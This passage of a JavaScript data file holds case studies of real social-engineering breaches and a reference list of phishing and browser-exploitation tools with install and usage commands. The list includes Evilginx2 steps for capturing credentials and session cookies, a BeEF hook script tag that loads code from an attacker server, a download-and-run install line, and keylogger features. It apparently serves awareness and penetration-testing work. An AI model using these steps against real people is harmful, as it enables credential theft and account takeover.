      "International wire transfers should trigger additional verification requirements",
      "Speed of response is critical for fund recovery -- the longer the delay, the less likely recovery becomes"
    ]
  },
  {
    name: "DNC / Podesta Email Hack",
    year: 2016,
    attacker: "APT28 / Fancy Bear (attributed to Russian GRU)",
    target: "Democratic National Committee, John Podesta",
    technique: "Spear Phishing with Credential Harvesting",
    description: "In March 2016, John Podesta, chairman of Hillary Clinton's presidential campaign, received a spear phishing email disguised as a Google security alert warning that someone had attempted to access his Gmail account. The email directed Podesta to change his password immediately by clicking a bit.ly shortened link that led to a fake Google login page. Despite an IT staffer initially identifying the email as legitimate rather than malicious in a response that may have been a typo (reportedly intending to write 'illegitimate'), Podesta clicked the link and entered his credentials. The attackers, later attributed to Russia's GRU military intelligence through APT28 (Fancy Bear), used the compromised credentials to access and exfiltrate over 50,000 of Podesta's emails. A parallel campaign compromised the DNC network. The stolen emails were subsequently published by WikiLeaks, significantly impacting the 2016 US presidential election.",
    impact: "Over 50,000 personal emails published. Significant political and reputational damage during a presidential election. Led to extensive investigations into foreign election interference. Prompted sweeping changes to political campaign cybersecurity practices. Demonstrated that a single phishing email could have national security implications.",
    lessonsLearned: [
      "A single phishing email can have geopolitical consequences",
      "IT security advice must be clear and unambiguous -- the cost of miscommunication can be enormous",
      "URL shorteners in security alerts are a critical red flag that should be flagged automatically",
      "Hardware-based two-factor authentication (like FIDO keys) would have prevented credential theft",
      "High-profile individuals and political organizations are prime targets for state-sponsored social engineering"
    ]
  },
  {
    name: "SolarWinds Supply Chain Attack",
    year: 2020,
    attacker: "APT29 / Cozy Bear (attributed to Russian SVR)",
    target: "SolarWinds, US Government Agencies, Fortune 500 Companies",
    technique: "Supply Chain Compromise, Social Engineering of Development Processes",
    description: "The SolarWinds attack, discovered in December 2020, was one of the most sophisticated supply chain compromises ever identified. While the full initial access vector remains partially classified, the operation involved the compromise of SolarWinds' build environment for their Orion IT monitoring platform. The attackers, attributed to Russia's SVR intelligence service operating as APT29 (Cozy Bear), inserted malicious code (known as SUNBURST) into legitimate Orion software updates that were then distributed to approximately 18,000 organizations. The social engineering component included establishing trust through the software supply chain itself -- organizations trusted the updates because they came from a verified vendor through normal update channels. The attackers also used social engineering to obtain credentials and move laterally within compromised organizations, and they conducted extensive reconnaissance to identify high-value targets among the 18,000 organizations that installed the trojanized update.",
    impact: "Approximately 18,000 organizations installed the compromised update. Confirmed breaches at multiple US government agencies including Treasury, Commerce, Homeland Security, and parts of the Pentagon. Major technology companies including Microsoft, Intel, and Cisco were affected. Total remediation costs estimated in the billions. Prompted Executive Order 14028 on improving national cybersecurity.",
    lessonsLearned: [
      "Software supply chain integrity is a critical security concern that requires dedicated controls",
      "Build systems and CI/CD pipelines are high-value targets that must be isolated and monitored",
      "Trust in vendor software updates can be weaponized at scale",
      "Network monitoring solutions themselves can become attack vectors if compromised",
      "Detection of supply chain compromises requires behavioral analysis beyond signature-based detection"
    ]
  },
  {
    name: "Colonial Pipeline Ransomware Attack",
    year: 2021,
    attacker: "DarkSide Ransomware Group",
    target: "Colonial Pipeline Company",
    technique: "Compromised VPN Credentials (likely obtained through social engineering or credential stuffing)",
    description: "In May 2021, Colonial Pipeline, the operator of the largest fuel pipeline in the United States, was shut down by a ransomware attack that began with a single compromised VPN password. The password, which belonged to an inactive VPN account that did not use multi-factor authentication, was likely obtained from a previous data breach or through social engineering. The DarkSide ransomware group used this single credential to gain access to Colonial Pipeline's IT network and deploy ransomware that encrypted critical business systems. While the attack targeted IT systems rather than operational technology (OT) systems that controlled the pipeline, Colonial Pipeline shut down pipeline operations as a precautionary measure because they could not be confident the OT network was unaffected. The six-day shutdown caused fuel shortages across the southeastern United States, panic buying, and gas station closures.",
    impact: "Six-day shutdown of the largest US fuel pipeline serving 45% of the East Coast's fuel supply. $4.4 million ransom paid in Bitcoin (approximately $2.3 million later recovered by the FBI). Fuel shortages and price spikes across the southeastern US. Triggered emergency declarations in multiple states. Led to new cybersecurity requirements for pipeline operators from the TSA.",
    lessonsLearned: [
      "Inactive accounts with network access represent critical vulnerabilities that must be regularly audited",
      "Multi-factor authentication is essential for all remote access points, especially VPN",
      "Credentials from data breaches can have catastrophic consequences if reused for corporate access",
      "IT and OT network segmentation is essential to prevent cascading impacts",
      "Critical infrastructure operators must have tested incident response plans that address ransomware scenarios"
    ]
  },
  {
    name: "Lapsus$ Attacks",
    year: 2022,
    attacker: "Lapsus$ Group (DEV-0537)",
    target: "Microsoft, Nvidia, Samsung, Okta, T-Mobile, Uber",
    technique: "SIM Swapping, Social Engineering, MFA Fatigue, Insider Recruitment",
    description: "The Lapsus$ group, composed primarily of teenagers from the UK and Brazil, conducted a series of high-profile breaches in early 2022 targeting some of the world's largest technology companies. Their primary techniques were social engineering-based rather than technically sophisticated. They used SIM swapping to bypass SMS-based multi-factor authentication, purchased credentials from employees and access brokers, conducted MFA fatigue attacks (repeatedly sending authentication prompts until the victim approved one), and directly recruited insiders through Telegram by offering payment for VPN credentials or MFA approval. The group compromised and leaked source code from Microsoft (including parts of Bing and Cortana), stole proprietary GPU technology from Nvidia, exfiltrated Samsung source code, and accessed Okta's internal systems through a third-party support contractor. Their brazen tactics and public taunting of victims highlighted the effectiveness of social engineering against even the most security-conscious organizations.",
    impact: "Source code leaks from Microsoft, Samsung, and Nvidia. Okta breach affected up to 366 customers. Nvidia's code signing certificates stolen and used to sign malware. Demonstrated that major technology companies were vulnerable to relatively unsophisticated social engineering. Seven members arrested, with the alleged leader being a 16-year-old from Oxford, England.",
    lessonsLearned: [
      "MFA fatigue attacks are effective and require number-matching or FIDO2-based authentication to mitigate",
      "Insider threats from bribed or coerced employees are a real and growing concern",
      "SIM swapping undermines SMS-based authentication and requires migration to hardware tokens",
      "Third-party contractor access must be secured as rigorously as internal employee access",
      "Motivated teenagers can compromise enterprises worth billions through social engineering alone"
    ]
  },
  {
    name: "MGM Resorts Cyberattack",
    year: 2023,
    attacker: "Scattered Spider (UNC3944) with ALPHV/BlackCat ransomware",
    target: "MGM Resorts International",
    technique: "Vishing, Help Desk Social Engineering",
    description: "In September 2023, MGM Resorts International suffered a devastating cyberattack that began with a simple phone call. Members of the Scattered Spider group, a threat actor known for sophisticated social engineering, identified an MGM employee on LinkedIn and called the MGM IT help desk impersonating that employee. The help desk agent, following the call, provided access that allowed the attackers to gain an initial foothold in MGM's network. The attackers then deployed ALPHV/BlackCat ransomware across MGM's systems, causing widespread disruption to casino operations, hotel reservations, room key cards, slot machines, ATMs, and the company's website. The attack forced MGM to shut down significant portions of its IT infrastructure, impacting operations at properties across the Las Vegas Strip and nationwide for over ten days. A similar group also attacked Caesars Entertainment around the same time, with Caesars reportedly paying approximately $15 million in ransom.",
    impact: "Over $100 million in financial impact to MGM. Ten or more days of disrupted operations across multiple properties. Hotel check-in systems, slot machines, ATMs, and loyalty programs went offline. Guest personal data compromised. MGM's stock price declined. The attack demonstrated that a single social engineering phone call could bring a $14 billion company to its knees.",
    lessonsLearned: [
      "Help desk identity verification procedures must be robust and resistant to social engineering",
      "LinkedIn and social media reconnaissance provides attackers with the information needed for impersonation",
      "Large hospitality and gaming companies are high-value targets due to their extensive IT infrastructure",
      "A single point of failure in identity verification can cascade into enterprise-wide compromise",
      "Incident response must account for prolonged outages affecting revenue-generating operations"
    ]
  },
  {
    name: "Twilio Breach",
    year: 2022,
    attacker: "0ktapus / Scatter Swine",
    target: "Twilio, Inc.",
    technique: "SMS Phishing (Smishing), Credential Harvesting",
    description: "In August 2022, cloud communications company Twilio was breached through a smishing campaign targeting current and former employees. Attackers sent text messages to Twilio employees that appeared to come from Twilio's IT department, warning that their passwords had expired or their schedules had changed, and providing a link to what appeared to be a Twilio SSO page. Employees who clicked the link and entered their credentials unknowingly provided the attackers with valid login information including MFA tokens. The attackers used these credentials to access Twilio's internal systems and customer data. The breach affected 163 Twilio customers, including Signal, the encrypted messaging app, where the attackers were able to re-register approximately 1,900 phone numbers to new devices. The same attacker group, known as 0ktapus, conducted similar attacks against over 130 organizations in a coordinated campaign.",
    impact: "163 Twilio customer accounts accessed. Data of approximately 1,900 Signal users compromised. Part of a broader campaign that targeted over 130 organizations and compromised approximately 10,000 employee credentials. Demonstrated that even security-focused companies serving sensitive customers could be compromised through basic smishing techniques.",
    lessonsLearned: [
      "SMS-based phishing can be as effective as email phishing and requires dedicated countermeasures",
      "FIDO2/WebAuthn hardware keys are resistant to credential harvesting attacks that defeat other MFA methods",
      "Incident communication must be rapid when downstream customers may be affected",
      "Employee phone numbers should be treated as sensitive information that can enable smishing attacks",
      "Coordinated campaigns can target multiple organizations simultaneously, complicating attribution and response"
    ]
  },
  {
    name: "Uber Internal Systems Breach",
    year: 2022,
    attacker: "Attributed to Lapsus$-affiliated individual",
    target: "Uber Technologies, Inc.",
    technique: "MFA Fatigue, Social Engineering via Messaging",
    description: "In September 2022, an 18-year-old attacker compromised Uber's internal systems through a combination of social engineering techniques. The attacker first obtained a contractor's credentials, likely from a dark web marketplace where they had been exposed in a prior breach. When attempting to use these credentials, the attacker was blocked by Uber's multi-factor authentication. The attacker then launched an MFA fatigue attack, sending repeated push notification authentication requests to the contractor's phone over the course of an hour. After the contractor did not initially accept the prompts, the attacker contacted them via WhatsApp, impersonating Uber IT support, and convinced them to approve the MFA request. Once inside the network, the attacker discovered a PowerShell script on an internal network share containing hardcoded admin credentials for Uber's privileged access management (PAM) system, which granted access to virtually all of Uber's internal tools, including AWS, GCP, Slack, SentinelOne, and HackerOne.",
    impact: "Complete access to Uber's internal systems including cloud infrastructure, security tools, and vulnerability reports. Source code repositories accessed. The attacker posted messages in Uber's internal Slack channels announcing the breach. HackerOne vulnerability reports were accessed, potentially exposing unfixed security flaws. The breach prompted a temporary shutdown of internal systems.",
    lessonsLearned: [
      "MFA fatigue attacks are a significant threat that requires push notification with number matching or FIDO2 keys",
      "Credentials hardcoded in scripts represent critical vulnerabilities that must be eliminated",
      "Privileged access management systems must themselves be protected with the strongest authentication",
      "Social engineering via messaging apps extends the attack surface beyond corporate email",
      "Contractor accounts need the same security rigor as employee accounts"
    ]
  },
  {
    name: "Okta Support System Breach",
    year: 2022,
    attacker: "Lapsus$ Group",
    target: "Okta, Inc. (via Sitel/Sykes support contractor)",
    technique: "Third-Party Contractor Compromise, Social Engineering",
    description: "In January 2022, the Lapsus$ group compromised Okta's customer support systems by first breaching Sitel (formerly Sykes Enterprises), a third-party support contractor that provided customer service for Okta. The attackers gained access to a Sitel support engineer's workstation, which had access to Okta's customer support tools including the ability to reset passwords, generate temporary credentials, and view customer data. The breach was particularly significant because Okta serves as the identity and access management provider for thousands of organizations worldwide, meaning a compromise of Okta's systems could cascade to affect their customers' security. Okta's initial response was criticized for minimizing the scope and impact of the breach, with the company initially claiming only 2.5% of customers (approximately 375 organizations) were potentially affected, though the actual scope may have been broader.",
    impact: "Up to 366 Okta customers potentially affected. Lapsus$ published screenshots of Okta's internal systems on Telegram. Significant reputational damage due to the perceived inadequacy of Okta's initial response. Okta's stock price dropped approximately 11% following disclosure. Prompted widespread review of identity provider security across the industry.",
    lessonsLearned: [
      "Identity providers are uniquely high-value targets because their compromise cascades to all customers",
      "Third-party contractor access must be minimized, monitored, and regularly audited",
      "Incident response communications must be transparent and accurate to maintain trust",
      "Support tool access should implement just-in-time provisioning rather than standing access",
      "Organizations must evaluate the security practices of their identity and access management providers"
    ]
  },
  {
    name: "Riot Games Source Code Theft",
    year: 2023,
    attacker: "Unknown attacker(s)",
    target: "Riot Games",
    technique: "Social Engineering, Developer Environment Compromise",
    description: "In January 2023, Riot Games, the developer of League of Legends and Valorant, disclosed that attackers had compromised their development environment through a social engineering attack targeting an employee. The attackers gained access to source code for League of Legends, Teamfight Tactics, and the company's legacy anti-cheat platform. Following the breach, the attackers demanded a $10 million ransom to prevent the release of the stolen source code. Riot Games refused to pay the ransom, and the source code was subsequently leaked online. The exposed anti-cheat source code was particularly concerning because it could potentially be used to develop more sophisticated cheating tools that would be harder to detect. Riot Games stated they would need to invest significant resources in developing new anti-cheat measures as a result.",
    impact: "Source code for major game titles and anti-cheat platform stolen and publicly leaked. Potential for increased cheating in League of Legends and other Riot titles. Development resources diverted to rebuilding anti-cheat capabilities. Ransom demand of $10 million refused. The attack demonstrated the value of game source code and anti-cheat systems to threat actors.",
    lessonsLearned: [
      "Game development environments contain high-value intellectual property that attracts targeted attacks",
      "Anti-cheat source code is particularly sensitive because its exposure directly enables the threats it protects against",
      "Refusing to pay ransoms is the recommended approach but requires preparation for the consequences of data leaks",
      "Developer environments require strong access controls and monitoring commensurate with the value of the code they contain",
      "Social engineering awareness training must extend to all employees, including developers who may not consider themselves typical targets"
    ]
  }
];

const SE_TOOLS = [
  {
    name: "Social Engineering Toolkit (SET)",
    description: "The Social Engineering Toolkit is an open-source Python framework designed specifically for social engineering penetration testing. Created by David Kennedy (TrustedSec), SET integrates with Metasploit and provides automated attack vectors including spear phishing, website cloning, credential harvesting, mass mailer attacks, and infectious media generator.",
    install: "git clone https://github.com/trustedsec/social-engineer-toolkit.git && cd social-engineer-toolkit && pip3 install -r requirements.txt && python3 setup.py install",
    commands: [
      "setoolkit                                    # Launch the SET interactive menu",
      "set:1 > Social-Engineering Attacks            # Select social engineering attack vector",
      "set:1:2 > Website Attack Vectors              # Clone a website for credential harvesting",
      "set:1:1 > Spear-Phishing Attack Vectors       # Create spear phishing email campaigns",
      "set:1:3 > Infectious Media Generator           # Create autorun payloads for USB devices",
      "set:1:9 > PowerShell Attack Vectors            # Generate PowerShell-based payloads",
      "set:1:5 > Mass Mailer Attack                   # Send mass phishing emails",
      "set:1:4 > Create a Payload and Listener        # Generate Metasploit payloads with SET"
    ]
  },
  {
    name: "Gophish",
    description: "Gophish is an open-source phishing simulation framework designed for enterprises and penetration testers. It provides a web-based interface for creating phishing campaigns, managing target groups, designing landing pages, and tracking campaign results with detailed analytics including email opens, link clicks, and credential submissions.",
    install: "wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip && unzip gophish-v0.12.1-linux-64bit.zip && chmod +x gophish",
    commands: [
      "./gophish                                     # Start Gophish server (default: https://localhost:3333)",
      "# Admin panel: https://localhost:3333          # Access the campaign management interface",
      "# Phish server: http://localhost:80            # Landing page server for targets",
      "# API: curl -H 'Authorization: Bearer <key>' https://localhost:3333/api/campaigns/   # List campaigns",
      "# Create campaign via API: POST /api/campaigns/ with JSON payload",
      "# Import targets: POST /api/groups/ with CSV data of email addresses",
      "# Create template: POST /api/templates/ with HTML email template",
      "# View results: GET /api/campaigns/<id>/results for detailed analytics"
    ]
  },
  {
    name: "King Phisher",
    description: "King Phisher is a phishing campaign toolkit for testing and promoting user awareness through simulated attacks. It features a client-server architecture with a GTK-based client interface, supports advanced campaign features including calendar invitations, two-factor authentication token harvesting, and plugin extensions for additional functionality.",
    install: "git clone https://github.com/rsmusllp/king-phisher.git && cd king-phisher && sudo tools/install.sh",
    commands: [
      "king-phisher-server -L INFO                   # Start the King Phisher server with INFO logging",
      "king-phisher-client                            # Launch the GTK client interface",
      "# Configure SMTP settings in the server config file at /etc/king-phisher/server_config.yml",
      "# Create campaigns via the client interface with HTML templates and tracking images",
      "# Use the built-in template editor to customize phishing email templates",
      "# Plugin: kp_plugin_manager --install <plugin>  # Install additional plugins",
      "# Generate reports: File > Export Campaign Data to export results in various formats",
      "# REST API available at https://<server>:8443/api/ for automation"
    ]
  },
  {
    name: "Evilginx2",
    description: "Evilginx2 is an advanced man-in-the-middle attack framework used for phishing login credentials along with session cookies, enabling attackers to bypass two-factor authentication. It operates as a transparent reverse proxy, sitting between the victim and the real website, capturing authentication tokens in real time as the victim logs in through the proxy.",
    install: "git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make",
    commands: [
      "./bin/evilginx -p ./phishlets                  # Start Evilginx2 with phishlet directory",
      ": config domain yourdomain.com                 # Set your phishing domain",
      ": config ipv4 <your-ip>                        # Set the server's external IP address",
      ": phishlets hostname outlook yourdomain.com     # Configure hostname for the Outlook phishlet",
      ": phishlets enable outlook                      # Enable the Outlook phishing proxy",
      ": lures create outlook                          # Create a phishing lure URL",
      ": lures get-url <lure-id>                       # Retrieve the phishing URL to send to targets",
      ": sessions                                      # List captured sessions with credentials and cookies"
    ]
  },
  {
    name: "Modlishka",
    description: "Modlishka is a flexible and powerful reverse proxy tool designed for automated phishing engagements. It can impersonate any target website with automatic TLS certificate generation and supports real-time credential and two-factor token interception without the need for pre-built website templates, making it more flexible than traditional phishing frameworks.",
    install: "go install github.com/drk1wi/Modlishka@latest",
    commands: [
      "Modlishka -config modlishka.json               # Start Modlishka with a configuration file",
      "# Configuration: set 'target' to the domain to proxy (e.g., 'target': 'gmail.com')",
      "# Configuration: set 'proxyDomain' to your phishing domain",
      "# Configuration: set 'listeningPort' to 443 for HTTPS",
      "# Configuration: set 'cert' and 'certKey' for TLS certificate paths",
      "# Configuration: set 'credParams' to specify which POST parameters contain credentials",
      "# Configuration: set 'terminateTriggers' to define when to redirect after capture",
      "# Captured credentials are logged to the configured output file or database"
    ]
  },
  {
    name: "BeEF (Browser Exploitation Framework)",
    description: "BeEF is a penetration testing tool that focuses on web browser exploitation. It allows penetration testers to assess the actual security posture of a target environment by hooking web browsers through XSS or social engineering, then using the hooked browser as a beachhead to launch further attacks against the target system and network from within the browser context.",
    install: "git clone https://github.com/beefproject/beef.git && cd beef && sudo ./install",
    commands: [
      "./beef                                          # Start the BeEF server",
      "# Admin panel: http://localhost:3000/ui/panel    # Access the BeEF control panel",
      "# Hook URL: <script src='http://<beef-ip>:3000/hook.js'></script>  # Browser hook script",
      "# Command modules: Social Engineering > Pretty Theft     # Fake login dialog overlay",
      "# Command modules: Social Engineering > Fake Flash Update # Fake update prompt",
      "# Command modules: Network > Get Internal IP              # Enumerate internal network",
      "# Command modules: Browser > Webcam                       # Attempt webcam access",
      "# RESTful API: curl http://localhost:3000/api/hooks?token=<token>  # List hooked browsers"
    ]
  },
  {
    name: "HiddenEye",
    description: "HiddenEye is a modern phishing tool that provides pre-built templates for numerous popular websites and services. It features live victim information capture including IP address, geolocation, device information, and credentials. HiddenEye also integrates with tunneling services like Ngrok and Serveo to expose local phishing pages to the internet without requiring a dedicated server or domain.",
    install: "git clone https://github.com/DarkSecDevelopers/HiddenEye-Legacy.git && cd HiddenEye-Legacy && pip3 install -r requirements.txt",
    commands: [
      "python3 HiddenEye.py                           # Launch HiddenEye interactive menu",
      "# Select target: Choose from 30+ pre-built website templates",
      "# Tunneling: Select Ngrok, Serveo, or LocalHostRun for public URL generation",
      "# Keylogger: Enable JavaScript-based keylogger to capture typed content",
      "# Captured data is stored locally and displayed in real time in the terminal",
      "# Custom pages: Place HTML files in the Sites/ directory for custom phishing templates",
      "# CloudFlare protection bypass: Built-in features to handle CF-protected targets"
    ]
  },
  {
    name: "Lucy Security (Awareness Platform)",
    description: "Lucy is a comprehensive security awareness and phishing simulation platform designed for enterprise environments. It provides a web-based management console for creating multi-vector social engineering campaigns including email phishing, smishing, vishing simulations, USB drop campaigns, and portable media attacks, along with integrated training content delivery and compliance reporting.",
    install: "# Lucy is available as a virtual appliance (OVA) or can be installed on Ubuntu: wget https://lucysecurity.com/download/lucy-latest.sh && chmod +x lucy-latest.sh && sudo ./lucy-latest.sh",
    commands: [
      "# Access web console: https://<lucy-ip>/                  # Lucy management interface",
      "# Campaign wizard: New Campaign > Select attack vector     # Create phishing simulation",
      "# Template editor: Scenarios > Email Templates              # Customize phishing emails",
      "# Landing pages: Scenarios > Landing Pages                  # Create credential capture pages",
      "# Awareness: Training > Modules                             # Assign training content post-click",
      "# Reporting: Reports > Campaign Results                     # View detailed campaign analytics",
      "# API: POST /api/v1/campaigns with JSON configuration       # Automate campaign creation",
      "# Schedule: Campaign Settings > Schedule                    # Set campaign timing and waves"
    ]
  }
];
